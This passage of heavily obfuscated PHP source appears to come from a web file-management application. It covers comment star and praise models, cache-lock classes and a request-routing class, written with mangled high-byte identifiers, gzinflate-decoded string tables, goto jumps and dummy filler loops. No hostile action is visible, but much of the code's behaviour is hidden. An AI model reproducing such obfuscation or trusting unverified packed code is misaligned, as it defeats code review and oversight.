$Ï“ŠÈ‚Â); $ƒºø”ˆå = $this->where($©ÏîÒˆ)->find(); if ($ƒºø”ˆå) { return $this->where(array($öÙ´¼–Ì[475] => $ƒºø”ˆå[$öÙ´¼–Ì[475]]))->delete(); } $®ŞÀÇÕ = array($öÙ´¼–Ì[1993] => 0, $öÙ´¼–Ì[1764] => USER_ID, $öÙ´¼–Ì[817] => 1, $öÙ´¼–Ì[171] => $öÙ´¼–Ì[12], $öÙ´¼–Ì[190] => $şîöÎÏà, $öÙ´¼–Ì[569] => $Ï“ŠÈ‚Â, $öÙ´¼–Ì[1996] => 0, $öÙ´¼–Ì[1995] => 0); return $this->add($®ŞÀÇÕ); } public function starTargetCount($¶ñÜüªö, $Ÿä¡ˆÅÏ) { $İø’±Èï =& $_SERVER[Ş­ğŠìÒ]; $¢’Êìô÷ = $Ÿä¡ˆÅÏ + self::TYPE_STAR_OFFSET; $ğôÑÁ³Ñ = $this->commentCount($¶ñÜüªö, $¢’Êìô÷); $ÖÒ®Íò = $this->commentCount($¶ñÜüªö, $¢’Êìô÷, USER_ID); return array($İø’±Èï[1998] => $ğôÑÁ³Ñ, $İø’±Èï[1999] => $ÖÒ®Íò); } public function starTargetUserList($Ô¬òšù×, $¢’†Ïå²) { $¯‹“¥˜¥ =& $_SERVER[Ş­ğŠìÒ]; $ä—˜Øœå = $Ô¬òšù× + self::TYPE_STAR_OFFSET; $Ã€Ï¸ñ£ = array($¯‹“¥˜¥[569] => $¢’†Ïå², $¯‹“¥˜¥[190] => $ä—˜Øœå); $É‰‘ëéô = $this->where($Ã€Ï¸ñ£)->count(); $Èº›ÂÁœ = array($¯‹“¥˜¥[332] => $É‰‘ëéô, $¯‹“¥˜¥[2000] => array()); if (!$É‰‘ëéô) { return $Èº›ÂÁœ; } $ß«‘øÍÇ = $this->field($¯‹“¥˜¥[1764])->where($Ã€Ï¸ñ£)->limit(500)->select(); $ß«‘øÍÇ = array_to_keyvalue($ß«‘øÍÇ, $¯‹“¥˜¥[12], $¯‹“¥˜¥[1764]); $Èº›ÂÁœ[$¯‹“¥˜¥[2000]] = Model($¯‹“¥˜¥[577])->userListInfo($ß«‘øÍÇ); return $Èº›ÂÁœ; } public function prasiseUserList($ïé‘­ÁË) { $Åèû›€€ =& $_SERVER[Ş­ğŠìÒ]; $şª¸ÉĞ¾ = array($Åèû›€€[2001] => $ïé‘­ÁË); $ªÒÃ–€ = $this->where($şª¸ÉĞ¾)->find(); $Õ£œ—¶½ = _get($ªÒÃ–€, $Åèû›€€[1996], 0); $Äô©ßˆñ = array($Åèû›€€[332] => $Õ£œ—¶½, $Åèû›€€[2000] => array()); if (!$Õ£œ—¶½) { return $Äô©ßˆñ; } $€Òì–›İ = Model($Åèû›€€[2002])->field($Åèû›€€[1764])->where($şª¸ÉĞ¾)->limit(500)->select(); $€Òì–›İ = array_to_keyvalue($€Òì–›İ, $Åèû›€€[12], $Åèû›€€[1764]); $Äô©ßˆñ[$Åèû›€€[2000]] = Model($Åèû›€€[577])->userListInfo($€Òì–›İ); return $Äô©ßˆñ; } public function remove($äáÁÜöÌ) { $Úí§Œ¿ =& $_SERVER[Ş­ğŠìÒ]; $‚Äœ³º¡ = array($Úí§Œ¿[1994] => $äáÁÜöÌ); $¡©š–Ğ‘ = $this->where($‚Äœ³º¡)->find(); if ($¡©š–Ğ‘[$Úí§Œ¿[1993]]) { $this->where(array($Úí§Œ¿[1994] => $¡©š–Ğ‘[$Úí§Œ¿[1993]]))->setAdd($Úí§Œ¿[1995], -1); } return $this->where($‚Äœ³º¡)->delete(); } public function edit($ù•ÃÎÒà, $±½‡ÑË) { $Ó­—à‰× =& $_SERVER[Ş­ğŠìÒ]; $è²èÑ÷· = array($Ó­—à‰×[1994] => $ù•ÃÎÒà); return $this->where($è²èÑ÷·)->save(array($Ó­—à‰×[2003] => $±½‡ÑË)); } public function prasise($ãÙ«ı´) { $Ğ¾­¿¯Â =& $_SERVER[Ş­ğŠìÒ]; $³ˆ¨Ô† = Model($Ğ¾­¿¯Â[2004]); $ª¨ºöÙ = array($Ğ¾­¿¯Â[1994] => $ãÙ«ı´, $Ğ¾­¿¯Â[1755] => USER_ID); $‡·“³‰· = $³ˆ¨Ô†->where($ª¨ºöÙ)->find(); if (!$‡·“³‰·) { $³ˆ¨Ô†->add($ª¨ºöÙ); $ÒÕÂ¼ğ£ = $this->where(array($Ğ¾­¿¯Â[1994] => $ãÙ«ı´))->setAdd($Ğ¾­¿¯Â[1996], 1); } else { $³ˆ¨Ô†->where($ª¨ºöÙ)->delete(); $ÒÕÂ¼ğ£ = $this->where(array($Ğ¾­¿¯Â[1994] => $ãÙ«ı´))->setAdd($Ğ¾­¿¯Â[1996], -1); } return $ÒÕÂ¼ğ£; } public function targetInfo($İ™ òÕŸ, $‡ò²‡Ô») { $¿Ù‡…Œ» =& $_SERVER[Ş­ğŠìÒ]; $Ñô¼òöù = array($¿Ù‡…Œ»[648] => $İ™ òÕŸ, $¿Ù‡…Œ»[649] => $‡ò²‡Ô»); $¾®³Êº = $this->where($Ñô¼òöù)->count(); $Ù”šñâç = "\122\x49\107\110\x54\x20\112\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\145\156\164\x5f\160\x72\x61\x69\163\145\40\x73\164\x61\162\40\x6f\x6e\40\x63\x6f\155\155\x65\156\164\x2e\x63\x6f\155\x6d\145\x6e\164\x49\104\40\75\x20\163\164\x61\x72\x2e\143\157\155\x6d\145\x6e\x74\x49\x44"; $Ï€µÉÒ© = $this->alias($¿Ù‡…Œ»[430])->where($Ñô¼òöù)->join($Ù”šñâç, $¿Ù‡…Œ»[2005])->count(); $Ö°ÅÅ´ = array($¿Ù‡…Œ»[2006] => $¾®³Êº, $¿Ù‡…Œ»[2007] => $Ï€µÉÒ©); return $Ö°ÅÅ´; } public function listData($§¥ªÇ÷ƒ) { $²œˆû¢ê =& $_SERVER[Ş­ğŠìÒ]; if (isset($§¥ªÇ÷ƒ[$²œˆû¢ê[2008]])) { if ($§¥ªÇ÷ƒ[$²œˆû¢ê[2008]]) { $§¥ªÇ÷ƒ[$²œˆû¢ê[2001]] = array($²œˆû¢ê[1088], intval($§¥ªÇ÷ƒ[$²œˆû¢ê[2008]])); } unset($§¥ªÇ÷ƒ[$²œˆû¢ê[2008]]); } if (isset($§¥ªÇ÷ƒ[$²œˆû¢ê[2009]])) { if ($§¥ªÇ÷ƒ[$²œˆû¢ê[2009]]) { $§¥ªÇ÷ƒ[$²œˆû¢ê[2001]] = array($²œˆû¢ê[1085], intval($§¥ªÇ÷ƒ[$²œˆû¢ê[2009]])); } unset($§¥ªÇ÷ƒ[$²œˆû¢ê[2009]]); } return $this->_listData($§¥ªÇ÷ƒ); } private function _listData($½¦š•Ğ) { $µÚğØîÛ =& $_SERVER[Ş­ğŠìÒ]; $ªõÖ¡£ = $this->where($½¦š•Ğ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ªõÖ¡£[$µÚğØîÛ[445]]); $this->_listAppendUser($ªõÖ¡£[$µÚğØîÛ[445]]); $this->_listAppendMeta($ªõÖ¡£[$µÚğØîÛ[445]]); return $ªõÖ¡£; } private function _makeOrder() { $£Ïúüü¤ =& $_SERVER[Ş­ğŠìÒ]; $Á·Çì„ = array($£Ïúüü¤[1996], $£Ïúüü¤[1995], $£Ïúüü¤[231]); $Î‘ø¾Âë = Input::get($£Ïúüü¤[530], $£Ïúüü¤[7], $£Ïúüü¤[497], $Á·Çì„); $×¶®©ğ¶ = Input::get($£Ïúüü¤[531], $£Ïúüü¤[7], $£Ïúüü¤[1757], array($£Ïúüü¤[2010], $£Ïúüü¤[526])); $ß¬Ï°­ó = $Î‘ø¾Âë . $£Ïúüü¤[53] . $×¶®©ğ¶; return $this->order($ß¬Ï°­ó); } private function _listAppendParent(&$ÎÑŒ‹°¬) { $‚Ğ¸é˜à =& $_SERVER[Ş­ğŠìÒ]; $§¡ÖÑîû = array_unique(array_to_keyvalue($ÎÑŒ‹°¬, $‚Ğ¸é˜à[12], $‚Ğ¸é˜à[1993])); $§¡ÖÑîû = array_remove_value($§¡ÖÑîû, $‚Ğ¸é˜à[228]); if (!$§¡ÖÑîû) { return; } $Êä¬ëñÉ = $this->where(array($‚Ğ¸é˜à[1994] => array($‚Ğ¸é˜à[7], $§¡ÖÑîû)))->select(); $Êä¬ëñÉ = array_to_keyvalue($Êä¬ëñÉ, $‚Ğ¸é˜à[2001]); foreach ($ÎÑŒ‹°¬ as &$İƒì¼¨¨) { if (isset($Êä¬ëñÉ[$İƒì¼¨¨[$‚Ğ¸é˜à[1993]]])) { $İƒì¼¨¨[$‚Ğ¸é˜à[2011]] = $Êä¬ëñÉ[$İƒì¼¨¨[$‚Ğ¸é˜à[1993]]]; } } unset($İƒì¼¨¨); } private function _listAppendUser(&$’¢”‡) { $íìÏî‰ =& $_SERVER[Ş­ğŠìÒ]; $Ä¨ÂŸµ® = array_unique(array_to_keyvalue($’¢”‡, $íìÏî‰[12], $íìÏî‰[1764])); $Ä¨ÂŸµ® = array_remove_value($Ä¨ÂŸµ®, $íìÏî‰[228]); if (count($Ä¨ÂŸµ®) == 0) { return; } foreach ($’¢”‡ as $¹»’ËÆú) { if (isset($¹»’ËÆú[$íìÏî‰[2011]])) { $Ä¨ÂŸµ®[] = $¹»’ËÆú[$íìÏî‰[2011]][$íìÏî‰[1764]]; } } $ãã÷šÌç = Model($íìÏî‰[598])->userListInfo($Ä¨ÂŸµ®); foreach ($’¢”‡ as &$¹»’ËÆú) { $¹»’ËÆú[$íìÏî‰[662]] = $ãã÷šÌç[$¹»’ËÆú[$íìÏî‰[1764]]]; if (isset($¹»’ËÆú[$íìÏî‰[2011]])) { $¹»’ËÆú[$íìÏî‰[2011]][$íìÏî‰[662]] = $ãã÷šÌç[$¹»’ËÆú[$íìÏî‰[2011]][$íìÏî‰[1764]]]; } } unset($¹»’ËÆú); } private function _listAppendMeta(&$®åöÖí) { $‘İ•Ô½™ =& $_SERVER[Ş­ğŠìÒ]; $ƒÄ„õâÈ = array_unique(array_to_keyvalue($®åöÖí, $‘İ•Ô½™[12], $‘İ•Ô½™[2001])); $ƒÄ„õâÈ = array_remove_value($ƒÄ„õâÈ, $‘İ•Ô½™[228]); if (!$ƒÄ„õâÈ) { return; } foreach ($®åöÖí as $ì˜¯¨é) { if (isset($ì˜¯¨é[$‘İ•Ô½™[2011]])) { $ƒÄ„õâÈ[] = $ì˜¯¨é[$‘İ•Ô½™[2011]][$‘İ•Ô½™[2001]]; } } $­ï‡°‚Ä = $this->metaList($ƒÄ„õâÈ); if (!$­ï‡°‚Ä) { return !1; } foreach ($®åöÖí as &$ì˜¯¨é) { $ì˜¯¨é[$‘İ•Ô½™[539]] = $­ï‡°‚Ä[$ì˜¯¨é[$‘İ•Ô½™[2001]]]; if (isset($ì˜¯¨é[$‘İ•Ô½™[2011]])) { $ì˜¯¨é[$‘İ•Ô½™[2011]][$‘İ•Ô½™[539]] = $­ï‡°‚Ä[$ì˜¯¨é[$‘İ•Ô½™[2011]][$‘İ•Ô½™[2001]]]; } } unset($ì˜¯¨é); } private function metaList($Šú‘×°ì) { $ÔØÜÖÉ =& $_SERVER[Ş­ğŠìÒ]; if (!$Šú‘×°ì) { return array(); } $¶†×–÷ = array($ÔØÜÖÉ[2001] => array($ÔØÜÖÉ[7], $Šú‘×°ì)); $ÚÜøÙäã = Model($ÔØÜÖÉ[2012])->where($¶†×–÷)->select(); $ÚÜøÙäã = array_to_keyvalue_group($ÚÜøÙäã, $ÔØÜÖÉ[2001]); foreach ($ÚÜøÙäã as $¨£¤‘¶˜ => $¯µ´îõÚ) { $¼“ó»äÆ = array(); foreach ($¯µ´îõÚ as $ñÑà­…µ) { $¼“ó»äÆ[$ñÑà­…µ[$ÔØÜÖÉ[97]]] = $ñÑà­…µ[$ÔØÜÖÉ[450]]; } $ÚÜøÙäã[$¨£¤‘¶˜] = $¼“ó»äÆ; } return $ÚÜøÙäã ? $ÚÜøÙäã : array(); } public function removeTarget($¹£¸–›Ï, $ñÉœ©Ê¿) { $ä™ä‘ =& $_SERVER[Ş­ğŠìÒ]; if (!$ñÉœ©Ê¿) { return !0; } $ñÉœ©Ê¿ = is_array($ñÉœ©Ê¿) ? $ñÉœ©Ê¿ : array($ñÉœ©Ê¿); $– ßìÈµ = array($ä™ä‘[190] => $¹£¸–›Ï, $ä™ä‘[569] => array($ä™ä‘[7], $ñÉœ©Ê¿)); $¥ÀØ°Íû = $this->field($ä™ä‘[2001])->where($– ßìÈµ)->select(); $€¯ø§äÖ = array_to_keyvalue($¥ÀØ°Íû, $ä™ä‘[12], $ä™ä‘[2001]); if (!$€¯ø§äÖ) { return !0; } $– ßìÈµ = array($ä™ä‘[2001] => array($ä™ä‘[7], $€¯ø§äÖ)); $this->where($– ßìÈµ)->delete(); Model($ä™ä‘[2004])->where($– ßìÈµ)->delete(); Model($ä™ä‘[2013])->where($– ßìÈµ)->delete(); } } goto b×±ÆÅóŠ¹; D¼‡¸ÕˆÕå: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Šé©ó» =& $_SERVER[Ş­ğŠìÒ]; $şË·ëŞ‚ = $GLOBALS[$Šé©ó»[6]][$Šé©ó»[425]]; self::$cachePath = $şË·ëŞ‚[$Šé©ó»[230]][$Šé©ó»[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($è™İğç, $ıéíÍ¾¶ = 0) { $Íº–›½ª =& $_SERVER[Ş­ğŠìÒ]; $Ú“†¼© = microtime(!0); $·æÙşÆ¹ = $Ú“†¼© + $ıéíÍ¾¶ + 0.0001; $•ÃİáØÚ = rtrim(self::$cachePath, $Íº–›½ª[8]) . $Íº–›½ª[930] . md5($è™İğç) . $Íº–›½ª[927]; if (file_exists($•ÃİáØÚ) && filemtime($•ÃİáØÚ) && filemtime($•ÃİáØÚ) < time() - 10) { @unlink($•ÃİáØÚ); } do { if (file_exists($•ÃİáØÚ)) { cacheLockWait(); continue; } $¶êûİ…¥ = fopen($•ÃİáØÚ, $Íº–›½ª[931]); if (!$¶êûİ…¥) { return !1; } $–¢»çÆ = flock($¶êûİ…¥, LOCK_EX | LOCK_NB); self::$caches[$è™İğç] = array($Íº–›½ª[932] => $¶êûİ…¥, $Íº–›½ª[230] => $•ÃİáØÚ); fwrite($¶êûİ…¥, $·æÙşÆ¹); clearstatcache(); if ($¶êûİ…¥ && $–¢»çÆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $·æÙşÆ¹); $this->unlock($è™İğç); return !1; } public function lockGet($¹«ÕÛ¼) { $ù´’ñƒ™ =& $_SERVER[Ş­ğŠìÒ]; $Û€ÅğÁè = rtrim(self::$cachePath, $ù´’ñƒ™[8]) . $ù´’ñƒ™[930] . md5($¹«ÕÛ¼) . $ù´’ñƒ™[927]; return file_exists($Û€ÅğÁè); } public function unlock($ãû‹Ëİß) { $œ„³Úı =& $_SERVER[Ş­ğŠìÒ]; $¤…†ŒÁ· = self::$caches[$ãû‹Ëİß]; if (!$¤…†ŒÁ·) { return; } @flock($¤…†ŒÁ·[$œ„³Úı[932]], LOCK_UN); @fclose($¤…†ŒÁ·[$œ„³Úı[932]]); @unlink($¤…†ŒÁ·[$œ„³Úı[230]]); unset(self::$caches[$ãû‹Ëİß]); } } class CacheLockRedis { public function lock($óÎ¹¶òí, $Á­ÌÃÈĞ = 10) { $›¬öİÀ = Cache::init(); $×À€é¯Ÿ = microtime(!0) + $Á­ÌÃÈĞ; while (microtime(!0) < $×À€é¯Ÿ) { $Õ›¤À… = $›¬öİÀ->get($óÎ¹¶òí); if (!$Õ›¤À…) { $îµÁÊØ¢ = $›¬öİÀ->setLock($óÎ¹¶òí, $×À€é¯Ÿ, $Á­ÌÃÈĞ); if ($îµÁÊØ¢) { return !0; } } else { if ($Õ›¤À… < microtime(!0)) { $›¬öİÀ->set($óÎ¹¶òí, $×À€é¯Ÿ, $Á­ÌÃÈĞ * 2); if ($›¬öİÀ->get($óÎ¹¶òí) === $Õ›¤À…) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($§¯º±«) { return Cache::init()->get($§¯º±«); } public function unlock($ÙùªîµÚ) { return Cache::init()->remove($ÙùªîµÚ); } } goto BÇİä´«—; BÇİä´«—: class CacheLockMemcached { public function lock($×ìôø€, $Ç°¬ëã˜ = 0) { $†¥¿Ş­° = Cache::init(); $¸´óÑ¼° = microtime(!0) + $Ç°¬ëã˜; while (microtime(!0) < $¸´óÑ¼°) { $ıŠ¤ç”½ = $†¥¿Ş­°->get($×ìôø€); if (!$ıŠ¤ç”½ || $ıŠ¤ç”½ < microtime(!0)) { $µÔõ² ¿ = $†¥¿Ş­°->handle->add($×ìôø€, $¸´óÑ¼°, $Ç°¬ëã˜); if ($µÔõ² ¿) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¶øìÓ) { return Cache::init()->get($¶øìÓ); } public function unlock($ëá™™ªß) { return Cache::init()->remove($ëá™™ªß); } } class CacheLockDatabase { public function lock($§Íë¹ò…, $Ä£Ûß¤ = 0) { $Ù¼»¼úğ = Model($_SERVER[Ş­ğŠìÒ][895]); $ıÊëì§Í = microtime(!0) + $Ä£Ûß¤; while (microtime(!0) < $ıÊëì§Í) { $½¸Ò‚ì = $Ù¼»¼úğ->get($§Íë¹ò…); if (!$½¸Ò‚ì || $½¸Ò‚ì < microtime(!0)) { $³–‰…Ÿ = $Ù¼»¼úğ->set($§Íë¹ò…, $ıÊëì§Í); if ($³–‰…Ÿ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÔÓ˜‡Ó¢) { return Model($_SERVER[Ş­ğŠìÒ][895])->get($ÔÓ˜‡Ó¢); } public function unlock($¹ï´Âô«) { Model($_SERVER[Ş­ğŠìÒ][895])->remove($¹ï´Âô«); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¥ÁÔé‰¿, $•¨éÆç») { $ÕãÊã¾ =& $_SERVER[Ş­ğŠìÒ]; if (!class_exists($ÕãÊã¾[933])) { show_json($ÕãÊã¾[934], !1); } $this->cacheTime = $•¨éÆç»; $this->handle = new Memcached(); if (is_array($¥ÁÔé‰¿[$ÕãÊã¾[935]]) && count($¥ÁÔé‰¿[$ÕãÊã¾[935]]) >= 1) { foreach ($¥ÁÔé‰¿[$ÕãÊã¾[935]] as $´¥¿ÛŸû) { $ì›Û¸üç = explode($ÕãÊã¾[4], $´¥¿ÛŸû); $this->handle->addServer($ì›Û¸üç[0], $ì›Û¸üç[1]); } } else { $this->handle->addServer($¥ÁÔé‰¿[$ÕãÊã¾[208]], $¥ÁÔé‰¿[$ÕãÊã¾[209]]); } } public function set($íº¹Ü£ø, $òëˆ¤´ú, $øÑéº– = false) { $øÑéº– = $øÑéº– ? $øÑéº– : $this->cacheTime; return $this->handle->set($íº¹Ü£ø, $òëˆ¤´ú, $øÑéº–); } public function get($ÄüÚª£Í) { return $this->handle->get($ÄüÚª£Í); } public function remove($âæÓ¯Š) { return $this->handle->delete($âæÓ¯Š); } public function deleteAll() { return $this->handle->flush(); } } goto BšîàÕÎ¸´; d™‚ßÖ†ˆ§: if (!$npzmyqjshe) { return; } $_SERVER[µ‡³ôÄƒ] = explode($_SERVER[Ş­ğŠìÒ][680], gzinflate(substr($_SERVER[Ş­ğŠìÒ][681], 10, -8))); $rfwnjsugob = $_SERVER[Ş­ğŠìÒ][682]; goto e„·ò–¬óŒ; aƒÆ¿…µ·Ç: define($_SERVER[Ş­ğŠìÒ][0], $_SERVER[Ş­ğŠìÒ][1]); $_SERVER[¯ç‚ëƒ¸] = explode($_SERVER[Ş­ğŠìÒ][2], gzinflate(substr($_SERVER[Ş­ğŠìÒ][3], 10, -8))); function binCheckEq($‘ö¨¯÷, $®¼ÑÅã£) { return $‘ö¨¯÷ == $®¼ÑÅã£; } goto fõ÷‰á ±ğ; e„·ò–¬óŒ: while ($rfwnjsugob < $_SERVER[Ş­ğŠìÒ][683]) { if ($rfwnjsugob >= 0) { break; } $rfwnjsugob++; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\144\145\x78"; function __construct() { } public function setDefault($€¸‡Ãš‘) { $„”­…Û— =& $_SERVER[Ş­ğŠìÒ]; $¸â¬ñ£ğ =& $_SERVER[µ‡³ôÄƒ]; $ÍÂ‡¶Ğ† = explode($¸â¬ñ£ğ[0], trim($€¸‡Ãš‘, $¸â¬ñ£ğ[0])); $this->defaultModule = $ÍÂ‡¶Ğ†[0] ? $ÍÂ‡¶Ğ†[0] : $this->defaultModule; $‚“…Š‡ó = $„”­…Û—[684]; while (strlen($‚“…Š‡ó) < $„”­…Û—[685]) { if (!$‚“…Š‡ó) { break; } $‚“…Š‡ó++; } $this->defaultController = $ÍÂ‡¶Ğ†[1] ? $ÍÂ‡¶Ğ†[1] : $this->defaultController; $Ø¦“ØÖ = $„”­…Û—[686]; if (strlen($Ø¦“ØÖ) < $„”­…Û—[687]) { die; } $this->defaultAction = $ÍÂ‡¶Ğ†[2] ? $ÍÂ‡¶Ğ†[2] : $this->defaultAction; $this->fose70d7a422($¸â¬ñ£ğ[1], array($this, $¸â¬ñ£ğ[2])); $‰Ş¹Ô« = $„”­…Û—[688]; } public function appRun($ô›œÒûÅ) { $Ò›ŠŒÔ  =& $_SERVER[µ‡³ôÄƒ]; $çúª—èÊ = explode($Ò›ŠŒÔ [0], $ô›œÒûÅ); $„µıÜÍ© = strtolower($çúª—èÊ[0]); $õùš¿†Ò = $Ò›ŠŒÔ [3]; if ($„µıÜÍ© == $Ò›ŠŒÔ [4]) { $õùš¿†Ò = $Ò›ŠŒÔ [5]; $çúª—èÊ[0] = $Ò›ŠŒÔ [6]; $çúª—èÊ[1] = $çúª—èÊ[1] . $Ò›ŠŒÔ [7]; $ô›œÒûÅ = join($Ò›ŠŒÔ [0], $çúª—èÊ); $ô›œÒûÅ = trim($ô›œÒûÅ, $Ò›ŠŒÔ [0]); } call_user_func(array($Ò›ŠŒÔ [8], $Ò›ŠŒÔ [9]), $õùš¿†Ò . $Ò›ŠŒÔ [10], $ô›œÒûÅ); ActionCall($ô›œÒûÅ); $Ø”ˆğ“Ñ = $_SERVER[Ş­ğŠìÒ][689]; call_user_func(array($Ò›ŠŒÔ [8], $Ò›ŠŒÔ [9]), $õùš¿†Ò . $Ò›ŠŒÔ [11], $ô›œÒûÅ); } private function autorun() { $•ä‹ŒŠ =& $_SERVER[µ‡³ôÄƒ]; global $config; if (count($config[$•ä‹ŒŠ[12]]) == 0) { return; } foreach ($config[$•ä‹ŒŠ[12]] as $ø‚Æ¢« => $ÏÊÃˆ†Ò) { $this->appRun($ÏÊÃˆ†Ò); } } private function znpka22c2e6f() { $°·äÂÏˆ =& $_SERVER[Ş­ğŠìÒ]; $Êµäñ¼ =& $_SERVER[µ‡³ôÄƒ]; $çî ä = $Êµäñ¼[4]; $¢™šâõ‰ = $GLOBALS[$Êµäñ¼[13]][$Êµäñ¼[14]][0]; if (!$¢™šâõ‰ || strlen($¢™šâõ‰) <= strlen($çî ä)) { return; } if (strtolower(substr($¢™šâõ‰, -strlen($çî ä))) != $çî ä) { return; } $·€‰—­ = substr($¢™šâõ‰, 0, -strlen($çî ä)); $â»ÖÆœ = $°·äÂÏˆ[690]; while ($â»ÖÆœ < $°·äÂÏˆ[687]) { if ($â»ÖÆœ >= 0) { break; } $â»ÖÆœ++; } $´«ç›Í = array($Êµäñ¼[4], $·€‰—­); $äƒ§â¸Û = $°·äÂÏˆ[682]; $ƒ³ëçÁ = array_slice($GLOBALS[$Êµäñ¼[13]][$Êµäñ¼[14]], 1); $ëôõâö¨ = $°·äÂÏˆ[691]; if (strlen($ëôõâö¨) < $°·äÂÏˆ[692]) { return; } $GLOBALS[$Êµäñ¼[13]][$Êµäñ¼[14]] = array_merge($´«ç›Í, $ƒ³ëçÁ); $ï´¨à = $°·äÂÏˆ[693]; $GLOBALS[$Êµäñ¼[13]][$Êµäñ¼[15]] = implode($Êµäñ¼[0], $GLOBALS[$Êµäñ¼[13]][$Êµäñ¼[14]]); $šşğ­Ü = $°·äÂÏˆ[694]; while ($šşğ­Ü < $°·äÂÏˆ[695]) { if ($šşğ­Ü >= 0) { break; } $šşğ­Ü++; } } private function dyvcfb159836() { $ä¸–Şå² =& $_SERVER[Ş­ğŠìÒ]; $º¹°ñ€• =& $_SERVER[µ‡³ôÄƒ]; if ($GLOBALS[$º¹°ñ€•[13]][$º¹°ñ€•[15]] != $º¹°ñ€•[6]) { return; } $‚Ãµ¨¾‹ = $_SERVER[$º¹°ñ€•[16]]; $°ÁáÉ™° = $º¹°ñ€•[17]; if (!strstr($‚Ãµ¨¾‹, $°ÁáÉ™°)) { return; } $ÍÄÜŠĞª = strrpos($‚Ãµ¨¾‹, $°ÁáÉ™°); $€ñ‹òª = substr($‚Ãµ¨¾‹, $ÍÄÜŠĞª + strlen($°ÁáÉ™°)); $’½Äª§Ö = $ä¸–Şå²[696]; if (strlen($’½Äª§Ö) < $ä¸–Şå²[695]) { return; } preg_match_all($º¹°ñ€•[18], $€ñ‹òª, $÷ÛÏ©öó); $€ñ‹òª = trim($÷ÛÏ©öó[0][0], $º¹°ñ€•[19]); $GLOBALS[$º¹°ñ€•[13]][$º¹°ñ€•[14]] = explode($º¹°ñ€•[19], $€ñ‹òª); $GLOBALS[$º¹°ñ€•[13]][$º¹°ñ€•[15]] = implode($º¹°ñ€•[0], $GLOBALS[$º¹°ñ€•[13]][$º¹°ñ€•[14]]); } public function run() { $ İ‹‘å¸ =& $_SERVER[Ş­ğŠìÒ]; $Ìä»·ü =& $_SERVER[µ‡³ôÄƒ]; $this->dyvcfb159836(); $this->znpka22c2e6f(); $¾’Öî£Ë = $GLOBALS[$Ìä»·ü[13]][$Ìä»·ü[14]]; $Ñ§°ªİı = $GLOBALS[$Ìä»·ü[13]][$Ìä»·ü[15]]; $„’®½¸¯ = $ İ‹‘å¸[697]; while ($„’®½¸¯ < $ İ‹‘å¸[692]) { if ($„’®½¸¯ >= 0) { break; } $„’®½¸¯++; } define($Ìä»·ü[20], isset($¾’Öî£Ë[0]) && $¾’Öî£Ë[0] ? $¾’Öî£Ë[0] : $this->defaultModule); $é­¦¤ß = $ İ‹‘å¸[698]; if (strlen($é­¦¤ß) < $ İ‹‘å¸[687]) { die; } define($Ìä»·ü[21], isset($¾’Öî£Ë[1]) && $¾’Öî£Ë[0] ? $¾’Öî£Ë[1] : $this->defaultController); define($Ìä»·ü[22], isset($¾’Öî£Ë[2]) && $¾’Öî£Ë[0] ? $¾’Öî£Ë[2] : $this->defaultAction); define($Ìä»·ü[23], MOD . $Ìä»·ü[0] . ST . $Ìä»·ü[0] . ACT); $š»®©î = $ İ‹‘å¸[699]; $_SERVER[$Ìä»·ü[24]] = strtolower(ACTION); $Š˜ğÖÏÒ = $ İ‹‘å¸[700]; if (strlen($Š˜ğÖÏÒ) < $ İ‹‘å¸[685]) { return; } $this->autorun(); $Ì¬¾ÅÈ = $ İ‹‘å¸[701]; if (count($¾’Öî£Ë) >= 3) { $this->appRun($Ñ§°ªİı); } else { $this->appRun(ACTION); } } private $hlkdbb0cf943 = array(); private $motpbd1ebf01 = ''; public function qycra930921e() { $–’‘³ïÉ =& $_SERVER[Ş­ğŠìÒ]; $¢µç“®À =& $_SERVER[µ‡³ôÄƒ]; $this->odgle4402e0d(); $this->qsrwa5707b63(); $ıüëò¸ = $–’‘³ïÉ[702]; $this->obutaabbc77d(); $Ç€¸‘ñü = $–’‘³ïÉ[703]; while ($Ç€¸‘ñü < $–’‘³ïÉ[692]) { if ($Ç€¸‘ñü >= 0) { break; } $Ç€¸‘ñü++; } $this->xkli31e9fcde(); $this->gtihf7c07719(); $this->budid0619abe(); $this->pjzfc24610e6(); $this->fose70d7a422($¢µç“®À[25], array($this, $¢µç“®À[26])); $Ïì‰áÂ = $–’‘³ïÉ[704]; if (strlen($Ïì‰áÂ) < $–’‘³ïÉ[685]) { return; } $this->fose70d7a422($¢µç“®À[27], array($this, $¢µç“®À[28])); $this->fose70d7a422($¢µç“®À[29], array($this, $¢µç“®À[30])); $Áï®´ÕÕ = $–’‘³ïÉ[705]; while ($Áï®´ÕÕ < $–’‘³ïÉ[685]) { if ($Áï®´ÕÕ >= 0) { break; } $Áï®´ÕÕ++; } $this->fose70d7a422($¢µç“®À[31], array($this, $¢µç“®À[32])); } public function jnos742bb6bc($‡Ù€ùÁ) { $şÛ—¤ÅË =& $_SERVER[Ş­ğŠìÒ]; $«Í¶µÚ =& $_SERVER[µ‡³ôÄƒ]; $Á…‡Ô³° = Model($«Í¶µÚ[33])->get(); $êİˆ¾Ã = array($«Í¶µÚ[34], $«Í¶µÚ[35], $«Í¶µÚ[36], $«Í¶µÚ[37], $«Í¶µÚ[38], $«Í¶µÚ[39], $«Í¶µÚ[40], $«Í¶µÚ[41], $«Í¶µÚ[42], $«Í¶µÚ[43], $«Í¶µÚ[44], $«Í¶µÚ[45], $«Í¶µÚ[46], $«Í¶µÚ[47], $«Í¶µÚ[48], $«Í¶µÚ[49], $«Í¶µÚ[50], $«Í¶µÚ[51], $«Í¶µÚ[52], $«Í¶µÚ[53], $«Í¶µÚ[54], $«Í¶µÚ[55], $«Í¶µÚ[56], $«Í¶µÚ[57], $«Í¶µÚ[58], $«Í¶µÚ[59], $«Í¶µÚ[60], $«Í¶µÚ[61], $«Í¶µÚ[62], $«Í¶µÚ[63], $«Í¶µÚ[64], $«Í¶µÚ[65], $«Í¶µÚ[66], $«Í¶µÚ[67], $«Í¶µÚ[68], $«Í¶µÚ[69], 